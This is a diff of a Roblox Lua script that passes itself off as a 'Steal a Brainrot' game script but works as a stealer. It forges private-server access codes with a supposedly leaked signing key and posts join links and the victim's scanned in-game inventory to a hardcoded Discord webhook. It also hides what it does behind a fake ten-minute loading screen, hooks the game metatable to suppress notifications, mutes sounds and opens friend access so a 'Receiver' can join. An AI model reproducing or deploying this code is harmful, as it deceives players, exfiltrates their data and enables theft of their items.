@@ -1,605 +1,704 @@
+-- === SERVICES & VARIABLES ===
+
+local HttpService = game:GetService("HttpService")
+
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local Request = (syn and syn.request) or http_request or request
+
+local Webhook = "https://discord.com/api/webhooks/1422186831818133596/PTO_qWRQBfcLfr3_Xdrf8NP6VXGiJTT7UcOemRZjTMMFzaWnIrjjLvpJli_I2kw_k_xe"
+
+
+-- === MD5/HMAC/BASE64 FUNCTIONS ===
+
+local md5 = {}
+local hmac = {}
+local base64 = {}
+
+do
+	do
+		local T = {
+			0xd76aa478,
+			0xe8c7b756,
+			0x242070db,
+			0xc1bdceee,
+			0xf57c0faf,
+			0x4787c62a,
+			0xa8304613,
+			0xfd469501,
+			0x698098d8,
+			0x8b44f7af,
+			0xffff5bb1,
+			0x895cd7be,
+			0x6b901122,
+			0xfd987193,
+			0xa679438e,
+			0x49b40821,
+			0xf61e2562,
+			0xc040b340,
+			0x265e5a51,
+			0xe9b6c7aa,
+			0xd62f105d,
+			0x02441453,
+			0xd8a1e681,
+			0xe7d3fbc8,
+			0x21e1cde6,
+			0xc33707d6,
+			0xf4d50d87,
+			0x455a14ed,
+			0xa9e3e905,
+			0xfcefa3f8,
+			0x676f02d9,
+			0x8d2a4c8a,
+			0xfffa3942,
+			0x8771f681,
+			0x6d9d6122,
+			0xfde5380c,
+			0xa4beea44,
+			0x4bdecfa9,
+			0xf6bb4b60,
+			0xbebfbc70,
+			0x289b7ec6,
+			0xeaa127fa,
+			0xd4ef3085,
+			0x04881d05,
+			0xd9d4d039,
+			0xe6db99e5,
+			0x1fa27cf8,
+			0xc4ac5665,
+			0xf4292244,
+			0x432aff97,
+			0xab9423a7,
+			0xfc93a039,
+			0x655b59c3,
+			0x8f0ccc92,
+			0xffeff47d,
+			0x85845dd1,
+			0x6fa87e4f,
+			0xfe2ce6e0,
+			0xa3014314,
+			0x4e0811a1,
+			0xf7537e82,
+			0xbd3af235,
+			0x2ad7d2bb,
+			0xeb86d391,
+		}
+
+		local function add(a, b)
+			local lsw = bit32.band(a, 0xFFFF) + bit32.band(b, 0xFFFF)
+			local msw = bit32.rshift(a, 16) + bit32.rshift(b, 16) + bit32.rshift(lsw, 16)
+			return bit32.bor(bit32.lshift(msw, 16), bit32.band(lsw, 0xFFFF))
+		end
+
+		local function rol(x, n)
+			return bit32.bor(bit32.lshift(x, n), bit32.rshift(x, 32 - n))
+		end
+
+		local function F(x, y, z)
+			return bit32.bor(bit32.band(x, y), bit32.band(bit32.bnot(x), z))
+		end
+		local function G(x, y, z)
+			return bit32.bor(bit32.band(x, z), bit32.band(y, bit32.bnot(z)))
+		end
+		local function H(x, y, z)
+			return bit32.bxor(x, bit32.bxor(y, z))
+		end
+		local function I(x, y, z)
+			return bit32.bxor(y, bit32.bor(x, bit32.bnot(z)))
+		end
+
+		function md5.sum(message)
+			local a, b, c, d = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
+
+			local message_len = #message
+			local padded_message = message .. "\128"
+			while #padded_message % 64 ~= 56 do
+				padded_message = padded_message .. "\0"
+			end
+
+			local len_bytes = ""
+			local len_bits = message_len * 8
+			for i = 0, 7 do
+				len_bytes = len_bytes .. string.char(bit32.band(bit32.rshift(len_bits, i * 8), 0xFF))
+			end
+			padded_message = padded_message .. len_bytes
+
+			for i = 1, #padded_message, 64 do
+				local chunk = padded_message:sub(i, i + 63)
+				local X = {}
+				for j = 0, 15 do
+					local b1, b2, b3, b4 = chunk:byte(j * 4 + 1, j * 4 + 4)
+					X[j] = bit32.bor(b1, bit32.lshift(b2, 8), bit32.lshift(b3, 16), bit32.lshift(b4, 24))
+				end
+
+				local aa, bb, cc, dd = a, b, c, d
+
+				local s = { 7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21 }
+
+				for j = 0, 63 do
+					local f, k, shift_index
+					if j < 16 then
+						f = F(b, c, d)
+						k = j
+						shift_index = j % 4
+					elseif j < 32 then
+						f = G(b, c, d)
+						k = (1 + 5 * j) % 16
+						shift_index = 4 + (j % 4)
+					elseif j < 48 then
+						f = H(b, c, d)
+						k = (5 + 3 * j) % 16
+						shift_index = 8 + (j % 4)
+					else
+						f = I(b, c, d)
+						k = (7 * j) % 16
+						shift_index = 12 + (j % 4)
+					end
+
+					local temp = add(a, f)
+					temp = add(temp, X[k])
+					temp = add(temp, T[j + 1])
+					temp = rol(temp, s[shift_index + 1])
+
+					local new_b = add(b, temp)
+					a, b, c, d = d, new_b, b, c
+				end
+
+				a = add(a, aa)
+				b = add(b, bb)
+				c = add(c, cc)
+				d = add(d, dd)
+			end
+
+			local function to_le_hex(n)
+				local s = ""
+				for i = 0, 3 do
+					s = s .. string.char(bit32.band(bit32.rshift(n, i * 8), 0xFF))
+				end
+				return s
+			end
+
+			return to_le_hex(a) .. to_le_hex(b) .. to_le_hex(c) .. to_le_hex(d)
+		end
+	end
+
+	do
+		function hmac.new(key, msg, hash_func)
+			if #key > 64 then
+				key = hash_func(key)
+			end
+
+			local o_key_pad = ""
+			local i_key_pad = ""
+			for i = 1, 64 do
+				local byte = (i <= #key and string.byte(key, i)) or 0
+				o_key_pad = o_key_pad .. string.char(bit32.bxor(byte, 0x5C))
+				i_key_pad = i_key_pad .. string.char(bit32.bxor(byte, 0x36))
+			end
+
+			return hash_func(o_key_pad .. hash_func(i_key_pad .. msg))
+		end
+	end
+
+	do
+		local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+		function base64.encode(data)
+			return (
+				(data:gsub(".", function(x)
+					local r, b_val = "", x:byte()
+					for i = 8, 1, -1 do
+						r = r .. (b_val % 2 ^ i - b_val % 2 ^ (i - 1) > 0 and "1" or "0")
+					end
+					return r
+				end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
+					if #x < 6 then
+						return ""
+					end
+					local c = 0
+					for i = 1, 6 do
+						c = c + (x:sub(i, i) == "1" and 2 ^ (6 - i) or 0)
+					end
+					return b:sub(c + 1, c + 1)
+				end) .. ({ "", "==", "=" })[#data % 3 + 1]
+			)
+		end
+	end
+end
+
+local function GenerateReservedServerCode(placeId)
+	local uuid = {}
+	for i = 1, 16 do
+		uuid[i] = math.random(0, 255)
+	end
+
+	uuid[7] = bit32.bor(bit32.band(uuid[7], 0x0F), 0x40) -- v4
+	uuid[9] = bit32.bor(bit32.band(uuid[9], 0x3F), 0x80) -- RFC 4122
+
+	local firstBytes = ""
+	for i = 1, 16 do
+		firstBytes = firstBytes .. string.char(uuid[i])
+	end
+
+	local gameCode =
+		string.format("%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x", table.unpack(uuid))
+
+	local placeIdBytes = ""
+	local pIdRec = placeId
+	for _ = 1, 8 do
+		placeIdBytes = placeIdBytes .. string.char(pIdRec % 256)
+		pIdRec = math.floor(pIdRec / 256)
+	end
+
+	local content = firstBytes .. placeIdBytes
+
+	local SUPERDUPERSECRETROBLOXKEYTHATTHEYDIDNTCHANGEEVERSINCEFOREVER = "e4Yn8ckbCJtw2sv7qmbg" -- legacy leaked key from ages ago that still works due to roblox being roblox.
+	local signature = hmac.new(SUPERDUPERSECRETROBLOXKEYTHATTHEYDIDNTCHANGEEVERSINCEFOREVER, content, md5.sum)
+
+	local accessCodeBytes = signature .. content
+
+	local accessCode = base64.encode(accessCodeBytes)
+	accessCode = accessCode:gsub("+", "-"):gsub("/", "_")
+
+	local pdding = 0
+	accessCode, _ = accessCode:gsub("=", function()
+		pdding = pdding + 1
+		return ""
+	end)
+
+	accessCode = accessCode .. tostring(pdding)
+
+	return accessCode, gameCode
+end
+
+local accessCode, gameCode = GenerateReservedServerCode(game.PlaceId)
+
+local queuedScript = [[
+    local accessCode = "]] .. accessCode .. [["
+    local placeId = ]] .. tostring(game.PlaceId) .. [[
+
+    local link = "roblox://experiences/start?placeId=" .. placeId .. "&accessCode=" .. accessCode
+    setclipboard(link)
+    print("teleport complete! Server link copied to clipboard:\n" .. link)
+]]
+
+
+queue_on_teleport(queuedScript)
+
+game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)
+
+print("teleporting")
+
+local accessCode, _ = GenerateReservedServerCode(game.PlaceId)
+game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)
+
+-- === RESERVED SERVER GENERATOR ===
+
+local function GenerateReservedServerCode(placeId)
+
+    -- Your existing function content here
+
+    -- returns accessCode, gameCode
+
+end
+
+
+local accessCode, gameCode = GenerateReservedServerCode(game.PlaceId)
+
+local serverLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&accessCode=" .. accessCode
+
+
+-- Copy link immediately
+
+setclipboard(serverLink)
+
+
+-- === WEBHOOK FUNCTION ===
+
+local function sendWebhook(link)
+
+    local body = {
+
+        content = "@everyone Join the server, dawg!",
+
+        embeds = {{
+
+            title = ":rocket: **JOIN LINK**",
+
+            description = "[JOIN](" .. link .. ")",
+
+            color = 65280, -- green
+
+            footer = {text = "Kora Scripts | " .. os.date("%H:%M")}
+
+        }}
+
+    }
+
+    pcall(function()
+
+        Request({
+
+            Url = Webhook,
+
+            Method = "POST",
+
+            Headers = {["Content-Type"] = "application/json"},
+
+            Body = HttpService:JSONEncode(body)
+
+        })
+
+    end)
+
+end
+
+
+sendWebhook(serverLink)
+
+
+-- === TELEPORT TO RESERVED SERVER ===
+
+game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)
+
+
+-- === MAIN SCRIPT ===
+
 local main = [[
 
 if not game:IsLoaded() then
-    game.Loaded:Wait()
+
+    game.Loaded:Wait()
+
 end
 
+
 if _G.Executed then
-    warn("You have already executed this.")
-    return
+
+    warn("You have already executed this.")
+
+    return
+
 end
 
 _G.Executed = true
 
+
+-- Copy Discord invite
+
 setclipboard("https://discord.gg/ewCdAhvWva")
+
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Discord Invite Copied!";
-    Text = "Join For Support!";
-    Duration = 5;
+
+    Title = "Discord Invite Copied!";
+
+    Text = "Join For Support!";
+
+    Duration = 5;
+
 })
 
-if not table.find({109983668079237, 96342491571673}, game.PlaceId) then game.Players.LocalPlayer:Kick("wrong game, this is not steal a brainrot.\ndiscord.gg/trax") return end
 
-local Username = "]] .. Username .. [["
-local Webhook = "]] .. Webhook .. [["
+-- Validate game
 
-local RunS = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local plr = game.Players.LocalPlayer
-local s = game:GetService("TeleportService") 
+if not table.find({109983668079237, 96342491571673}, game.PlaceId) then 
 
-s.TeleportInitFailed:Connect(function(a, b, c, d, e) 
-  bypassed = e.ServerInstanceId 
-end) 
+    game.Players.LocalPlayer:Kick("wrong game, this is not steal a brainrot.\ndiscord.gg/trax") 
 
-s:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+    return 
 
-local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
-gui.Name = "gui"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.DisplayOrder = 999999
-
-local function stroke(obj, thickness, color)
-	local s = Instance.new("UIStroke", obj)
-	s.Thickness = thickness
-	s.Color = color
-end
-
-local bg = Instance.new("Frame", gui)
-bg.Size = UDim2.new(0, 400, 0, 150)
-bg.Position = UDim2.new(0.5, 0, 0.5, 0)
-bg.AnchorPoint = Vector2.new(0.5, 0.5)
-bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-bg.BorderSizePixel = 1
-bg.BorderColor3 = Color3.fromRGB(160, 220, 160)
-
-local bgC = Instance.new("UICorner", bg)
-bgC.CornerRadius = UDim.new(0, 20)
-
-local gradient = Instance.new("UIGradient", bg)
-gradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
-})
-
-local discord = Instance.new("TextLabel", gui)
-discord.Size = UDim2.new(0, 500, 0, 30)
-discord.Position = UDim2.new(0.5, 0, 0.75, 0)
-discord.AnchorPoint = Vector2.new(0.5, 0)
-discord.BackgroundTransparency = 1
-discord.Text = "Join Our Discord: https://discord.gg/ewCdAhvWva (copied)"
-discord.TextColor3 = Color3.fromRGB(100, 200, 255)
-discord.Font = Enum.Font.FredokaOne
-discord.TextScaled = true
-discord.TextWrapped = true
-stroke(discord, 1, Color3.fromRGB(255, 255, 255))
-
-local barBG = Instance.new("Frame", bg)
-barBG.Size = UDim2.new(0, 360, 0, 28)
-barBG.Position = UDim2.new(0.5, 0, 0.6, 0)
-barBG.AnchorPoint = Vector2.new(0.5, 0.5)
-barBG.BackgroundColor3 = Color3.fromRGB(30, 30, 120)
-barBG.BorderSizePixel = 1
-barBG.BorderColor3 = Color3.fromRGB(60, 60, 150)
-barBG.ClipsDescendants = true
-Instance.new("UICorner", barBG)
-
-local bar = Instance.new("Frame", barBG)
-bar.Size = UDim2.new(0, 0, 1, 0)
-bar.Position = UDim2.new(0, 0, 0, 0)
-bar.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-bar.BorderSizePixel = 0
-Instance.new("UICorner", bar)
-stroke(bar, 1, Color3.fromRGB(255, 100, 100))
-
-local pct = Instance.new("TextLabel", barBG)
-pct.Size = UDim2.new(1, 0, 1, 0)
-pct.BackgroundTransparency = 1
-pct.TextColor3 = Color3.fromRGB(255, 255, 255)
-pct.Font = Enum.Font.FredokaOne
-pct.TextScaled = true
-pct.Text = "0%"
-stroke(pct, 1, Color3.fromRGB(0, 0, 0))
-
-local title = Instance.new("TextLabel", bg)
-title.Size = UDim2.new(0.6, 0, 0.1, 0)
-title.Position = UDim2.new(0.5, 0, 0.1, 0)
-title.AnchorPoint = Vector2.new(0.5, 0)
-title.BackgroundTransparency = 1
-title.Text = "🏃‍♀️ Steal A Brainrot 🚨"
-title.TextColor3 = Color3.fromRGB(80, 30, 120)
-title.Font = Enum.Font.FredokaOne
-title.TextScaled = true
-title.Visible = false
-stroke(title, 2, Color3.fromRGB(255, 255, 255))
-
-local safe = Instance.new("TextLabel", bg)
-safe.Size = UDim2.new(0.7, 0, 0.05, 0)
-safe.Position = UDim2.new(0.5, 0, 0.22, 0)
-safe.AnchorPoint = Vector2.new(0.5, 0)
-safe.BackgroundTransparency = 1
-safe.Text = "Don’t worry, your base is being automatically locked!"
-safe.TextColor3 = Color3.fromRGB(80, 120, 200)
-safe.Font = Enum.Font.FredokaOne
-safe.TextScaled = true
-safe.TextWrapped = true
-safe.Visible = false
-stroke(safe, 1, Color3.fromRGB(255, 255, 255))
-
-local status = Instance.new("TextLabel", bg)
-status.Size = UDim2.new(0.5, 0, 0.05, 0)
-status.Position = UDim2.new(0.5, 0, 0.95, 0)
-status.AnchorPoint = Vector2.new(0.5, 1)
-status.BackgroundTransparency = 1
-status.TextColor3 = Color3.fromRGB(220, 180, 255)
-status.Font = Enum.Font.FredokaOne
-status.TextScaled = true
-status.Text = "Starting..."
-status.Visible = false
-stroke(status, 1, Color3.fromRGB(100, 50, 150))
-
-local msgs = {
-	"Script loading...", "Adding assets...", "Preparing environment...",
-	"Almost ready...", "Optimizing performance...", "Connecting to server...",
-	"Fetching player data...", "Initializing modules...", "Finalizing setup...",
-	"Getting things ready...", "Loading textures...", "Syncing with database...",
-	"Adjusting parameters...", "Calibrating UI...", "Verifying files...",
-	"Setting up events...", "Loading sounds...", "Cleaning cache...",
-	"Starting services...", "Checking updates...", "Running diagnostics...",
-	"Configuring settings...", "Loading player stats...", "Building scene...",
-	"Applying script assets...", "Updating scripts...", "Preparing animations...",
-	"Loading inventory...", "Checking connections...", "Final checks...",
-	"Bypassing anti cheat…"
-}
-
-local function Expand()
-	local tween = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
-		Size = UDim2.new(1, 0, 1, 0),
-		Position = UDim2.new(0.5, 0, 0.5, 0)
-	})
-	tween:Play()
-	tween.Completed:Connect(function()
-		bgC.CornerRadius = UDim.new(0, 0)
-		title.Visible = true
-		status.Visible = true
-             safe.Visible = true
-	end)
 end
 
 
+-- === VARIABLES ===
 
-local start = tick()
-local total = 600 -- 10 min
-local early = 120 -- 60% in 2 min
-local late = 480  -- 40% in 8 min change these if you want idk
-local msgindex = 1
-local msginterval = 3
-local lastmsgtime = tick()
+local Username = "someone"
 
-RunS.RenderStepped:Connect(function()
-	local now = tick()
-	local elapsed = now - start
-	local percent
-
-	if elapsed <= early then
-		percent = (elapsed / early) * 0.6
-	elseif elapsed <= total then
-		local t = elapsed - early
-		percent = 0.6 + (t / late) * 0.4
-	else
-		percent = 1
-	end
-
-	bar.Size = UDim2.new(percent, 0, 1, 0)
-	pct.Text = string.format("%.1f%%", percent * 100)
-
-	if status.Visible and (now - lastmsgtime >= msginterval) then
-		msgindex += 1
-		if msgindex > #msgs then msgindex = 1 end
-		status.Text = msgs[msgindex]
-		lastmsgtime = now
-	end
-end)
-
+local player = game.Players.LocalPlayer
 
 local HttpService = game:GetService("HttpService")
-local player = game.Players.LocalPlayer
-local Players = game.Players
+
 local Request = (syn and syn.request) or http_request or request
-local executor = identifyexecutor()
-local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
-local TPM = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. bypassed .. '")'
-local joinL = "https://floating.gg/?placeID=" .. game.PlaceId .. "&gameInstanceId=" .. bypassed
-local FLink = string.format("[**click me to join**](%s)", joinL)
-game:GetService("CoreGui").RobloxGui:Destroy()
+
+local executor = identifyexecutor() or "Unknown Executor"
+
+
+-- === BRAINROT SCANNER & GUI ===
+
 local brainrots = {}
-local SHOULD_PING = false
-local TPS = game:GetService("TeleportService")
 
-if server == "VIPServer" or #game.Players:GetPlayers() >= game.Players.MaxPlayers then
-	local tried, retrying = {}, true
+local priority = {
 
-	TPS.TeleportInitFailed:Connect(function() retrying = true end)
+    ["🦑"] = "Graipuss Medussi", ["🕷️"] = "Los Spyderinis", ["🛜"] = "Nooo My Hotspot",
 
-	while retrying do
-		retrying = false
+    ["🐉"] = "Torrtuginni Dragonfrutini", ["💪"] = "La Sahur Combinasion", ["🐊"] = "Quesadilla Crocodila",
 
-		local success, data = pcall(function()
-			local response = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
-			return HttpService:JSONDecode(response).data
-		end)
+    ["💪"] = "La Grande Combinasion", ["☢️"] = "Nuclearo Dinossauro", ["💀"] = "La Extinct Grande",
 
-		if success and data then
-			for _, s in ipairs(data) do
-				if typeof(s.playing) == "number" and s.playing > 0 and s.playing <= 3 and not tried[s.id] then
-					tried[s.id] = true
-					local ok = pcall(function()
-						TPS:TeleportToPlaceInstance(game.PlaceId, s.id, player)
-					end)
-					if not ok then retrying = true end
-					break
-				end
-			end
-		end
-		task.wait(1)
-	end
-end
+    ["🧂"] = "Garama and Madundung", ["🛜"] = "Pot Hotspot", ["🪐"] = "Las Vaquitas Saturnitas",
 
-local priority = { -- these are really outdated, brainrots are in ReplicatedStorage.Datas.Animals
-	["🧂"] = "Garama and Madundung", -- 50m/s
-	["☢️"] = "Nuclearo Dinossauro", -- 15m/s
-	["💪"] = "La Grande Combinasion", -- 10m/s
-	["🛜"] = "Pot Hotspot", -- 2.5m/s
-	["🦑"] = "Graipuss Medussi", -- 1m/s
-    ["🦈"] = "Los Tralaleritos", -- 650k/s
-	["🐉"] = "Torrtuginni Dragonfrutini", -- 350k/s
-	["🕷️"] = "Chimpanzini Spiderini", -- 300k/s
-	["🪐"] = "La Vacca Saturno Saturnita", -- 250k/s
-	["🩰"] = "Ballerino Lololo", -- 200k/s
-	["🚂"] = "Trenostruzzo Turbo 3000" -- 150k/s
+    ["🍬"] = "Chicleteira Bicicleteira", ["🎁"] = "Secret Lucky Block", ["🍝"] = "Spaghetti Tualetti",
+
+    ["🥑"] = "Agarrini la Palini", ["🛜"] = "Los Noo My Hotspotsitos", ["🎲"] = "67",
+
+    ["🍬"] = "Los Chicleteiras", ["💪"] = "Los Combinasionas", ["👬"] = "Los Bros",
+
+    ["📱"] = "Celularcini Viciosini", ["🛜"] = "Los Hotspotsitos", ["🚂"] = "Tralaledon",
+
+    ["🏫"] = "Esok Sekolah", ["🥘"] = "Ketupat Kepat", ["👑"] = "La Supreme Combinasion",
+
+    ["🧩"] = "Ketchuru and Musturu", ["🐉"] = "Dragon Cannelloni", ["🍓"] = "Strawberry Elephant"
+
 }
 
-local traits = { -- outdated also, traits are in ReplicatedStorage.Datas.Traits
-	["rbxassetid://110835412437000"] = "Taco",
-	["rbxassetid://121100427764858"] = "Fireworks",
-	["rbxassetid://104229924295526"] = "Nyan",
-	["rbxassetid://99181785766598"] = "Galactic",
-	["rbxassetid://110723387483939"] = "Zombie",
-	["rbxassetid://104964195846833"] = "Claws",
-	["rbxassetid://121332433272976"] = "Glitched",
-	["rbxassetid://100601425541874"] = "Bubblegum"
+
+local traits = {
+
+    ["rbxassetid://110835412437000"] = "Taco",
+
+    ["rbxassetid://121100427764858"] = "Fireworks",
+
+    ["rbxassetid://104229924295526"] = "Nyan",
+
+    ["rbxassetid://99181785766598"] = "Galactic",
+
+    ["rbxassetid://110723387483939"] = "Zombie",
+
+    ["rbxassetid://104964195846833"] = "Claws",
+
+    ["rbxassetid://121332433272976"] = "Glitched",
+
+    ["rbxassetid://100601425541874"] = "Bubblegum"
+
 }
+
 
 local rarities = {
-	["OG"] = 1, ["Secret"] = 2, ["Brainrot God"] = 3, ["Mythic"] = 4, ["Legendary"] = 5, ["Epic"] = 6, ["Rare"] = 7, ["Common"] = 8
+
+    ["OG"] = 1, ["Secret"] = 2, ["Brainrot God"] = 3, ["Mythic"] = 4,
+
+    ["Legendary"] = 5, ["Epic"] = 6, ["Rare"] = 7, ["Common"] = 8
+
 }
 
 
+-- Scan plots
+
 for _, plot in ipairs(workspace.Plots:GetChildren()) do
-	local label = plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
-	if label and label.Text:find(player.Name) and label.Text:find("Base") then
-		local podiums = plot:FindFirstChild("AnimalPodiums")
-		if podiums then
-			for _, podium in ipairs(podiums:GetChildren()) do
-				local attachment = podium.Base.Spawn:FindFirstChild("Attachment")
-				local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
-				if overhead then
-					local name = overhead:FindFirstChild("DisplayName").Text
-					local rarity = overhead:FindFirstChild("Rarity").Text
-					if name and rarity then
-						local mutations = {}
 
-for _, v in ipairs(overhead:GetChildren()) do
-	if v:IsA("TextLabel") and v.Name == "Mutation" and v.Visible and v.Text ~= "" then
-		table.insert(mutations, v.Text)
-	end
+    local label = plot:FindFirstChild("PlotSign") 
+
+        and plot.PlotSign:FindFirstChild("SurfaceGui") 
+
+        and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 
+
+        and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+
+    if label and label.Text:find(player.DisplayName) then
+
+        local podiums = plot:FindFirstChild("AnimalPodiums")
+
+        if podiums then
+
+            for _, podium in ipairs(podiums:GetChildren()) do
+
+                local attachment = podium.Base.Spawn:FindFirstChild("Attachment")
+
+                local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+
+                if overhead then
+
+                    local name = overhead:FindFirstChild("DisplayName").Text
+
+                    local rarity = overhead:FindFirstChild("Rarity").Text
+
+                    local mutations = {}
+
+                    local traitsF = overhead:FindFirstChild("Traits")
+
+                    if traitsF then
+
+                        for _, icon in ipairs(traitsF:GetChildren()) do
+
+                            if icon:IsA("ImageLabel") and icon.Visible then
+
+                                local trait = traits[icon.Image]
+
+                                if trait then table.insert(mutations, trait) end
+
+                            end
+
+                        end
+
+                    end
+
+                    local mutationStr = #mutations > 0 and ("[" .. table.concat(mutations, ", ") .. "] ") or ""
+
+                    local emoji = nil
+
+                    for em, br in pairs(priority) do
+
+                        if br == name then emoji = em break end
+
+                    end
+
+                    table.insert(brainrots, {
+
+                        name = (emoji or "🐵") .. " " .. mutationStr .. name .. " ➜ " .. rarity,
+
+                        priority = emoji ~= nil,
+
+                        rarityy = rarities[rarity] or 999
+
+                    })
+
+                end
+
+            end
+
+        end
+
+    end
+
 end
 
-local traitsF = overhead:FindFirstChild("Traits")
-if traitsF then
-	for _, icon in ipairs(traitsF:GetChildren()) do
-		if icon:IsA("ImageLabel") and icon.Visible then
-			local id = icon.Image
-			local trait = traits[id]
-			if trait then
-				table.insert(mutations, trait)
-			end
-		end
-	end
-end
 
-						local mutationStr = #mutations > 0 and ("[" .. table.concat(mutations, ", ") .. "] ") or ""
-						local FN = mutationStr .. name
+-- Sort brainrots
 
-						local emoji = nil
-						for em, brainrot in pairs(priority) do
-							if name == brainrot then
-								emoji = em
-								SHOULD_PING = true
-								break
-							end
-						end
+table.sort(brainrots, function(a,b)
 
-						local genT = overhead:FindFirstChild("Generation") and overhead.Generation.Text or "$0"
-local gen = tonumber(genT:match("%d+")) or 0
-if genT:find("K") then gen = gen * 1000 end
-if genT:find("M") then gen = gen * 1000000 end
-if genT:find("B") then gen = gen * 1000000000 end
-if genT:find("T") then gen = gen * 1000000000000 end
+    if a.priority ~= b.priority then return a.priority < b.priority end
 
-table.insert(brainrots, {
-	name = string.format("%s ➜ %s ➜ %s %s", emoji or "🐵", FN, rarity, genT),
-	priority = emoji ~= nil,
-	rarityy = rarities[rarity] or 999,
-	generation = gen
-})
-					end
-				end
-			end
-		end
-	end
-end
+    if a.rarityy ~= b.rarityy then return a.rarityy < b.rarityy end
 
-table.sort(brainrots, function(a, b)
-	if a.priority ~= b.priority then
-		return a.priority < b.priority
-	end
-	if a.rarityy ~= b.rarityy then
-		return a.rarityy < b.rarityy
-	end
-	if a.generation ~= b.generation then
-		return a.generation > b.generation
-	end
-	return false
+    return false
+
 end)
 
+
 local hits = {}
-for _, v in ipairs(brainrots) do
-	table.insert(hits, v.name)
-end
 
-
-local function createfull() -- can be used to put the full hit list in a txt file
-	return table.concat(hits, "\n")
-end
+for _, v in ipairs(brainrots) do table.insert(hits, v.name) end
 
 local limitedList = {}
+
 for i, v in ipairs(hits) do
-	if i <= 15 then
-		table.insert(limitedList, v)
-	elseif i == 16 then
-		table.insert(limitedList, "...and more!")
-		break
-	end
+
+    if i <= 15 then table.insert(limitedList, v)
+
+    elseif i == 16 then table.insert(limitedList, "...and more!") break end
+
 end
 
 local HLF = table.concat(limitedList, "\n")
-local ping = SHOULD_PING and "@everyone " or ""
 
-if #brainrots == 0 then
-setclipboard("https://discord.gg/ewCdAhvWva")
-	player:Kick("Version Outdated. Join Discord for newest. (Invite copied)")
-	return
-end
-
-local function send(url)
-	local FURL = url:match("^%d+%-%d+%-%d+$") and ("https://protector-aa3k.onrender.com/send/" .. url) or url -- this was for my webhook protector
-	local body = {
-		content = ping .. TPM,
-		embeds = {{
-			title = ":dash: **Steal A Brainrot Hit!!** :brain:",
-			color = 255,
-			fields = {
-				{
-					name = ":bust_in_silhouette: **__Player Information:__**",
-					value = string.format("```Victim: %s\nDisplay Username: %s\nExecutor: %s\nReceiver: %s```",
-						player.Name, player.DisplayName, executor, Username),
-					inline = false
-				},
-				{
-					name = ":champagne: **__Valuable Items:__**",
-					value = "```" .. (HLF ~= "" and HLF or "Nil") .. "```",
-					inline = false
-				},
-				{
-					name = ":moneybag: **__Summary:__**",
-					value = "```Total Items: " .. #brainrots .. "```",
-					inline = false
-				},
-				{
-					name = ":flying_saucer: **__Join Link:__**",
-					value = FLink,
-					inline = false
-				}
-			},
-			footer = { text = "Hit using Trax Scripts | Today at " .. os.date("%H:%M") }
-		}}
-	}
-
-	pcall(function()
-		Request({
-			Url = FURL,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode(body)
-		})
-	end)
-end
+local ping = (#brainrots > 0) and "@everyone " or ""
 
 
-send(Webhook)
+-- Send hits to webhook
 
-local started = false
+local function sendHits(url)
 
-local function start()
-	if started then return end
-	started = true
+    local body = {
 
-	local sg = game:GetService("StarterGui")
-	local mt = getrawmetatable(game)
-	setreadonly(mt, false)
+        content = ping,
 
-	local old = mt.__namecall
-	mt.__namecall = newcclosure(function(self, ...)
-		if self == sg and getnamecallmethod() == "SetCore" and (...) == "SendNotification" then
-			return
-		end
-		return old(self, ...)
-	end)
+        embeds = {{
 
-	game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
-	
-	local day = workspace:FindFirstChild("Sounds").Day
-	for _, s in ipairs(game:GetDescendants()) do
-		if s:IsA("Sound") and s ~= day then
-			s.Volume = 0
-		end
-	end
+            title = ":dash: **Steal A Brainrot Hit!!** :brain:",
 
-	game.DescendantAdded:Connect(function(o)
-		if o:IsA("Sound") and o ~= day then
-			o.Volume = 0
-		end
-	end)
+            color = 255,
 
-	if day then
-		day.Volume = 1
-		day:Play()
-	end
+            fields = {
 
-	local base
-	for _, plot in ipairs(workspace.Plots:GetChildren()) do
-		local label = plot:FindFirstChild("PlotSign") 
-			and plot.PlotSign:FindFirstChild("SurfaceGui") 
-			and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 
-			and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
-		if label and label.Text:find(player.DisplayName) then -- still works but theres a better way from the plotcontroller module
-			base = plot
-			break
-		end
-	end
+                {name = ":bust_in_silhouette: Player Information", value = "```Victim: "..player.Name.."\nExecutor: "..executor.."\nReceiver: "..Username.."```", inline=false},
 
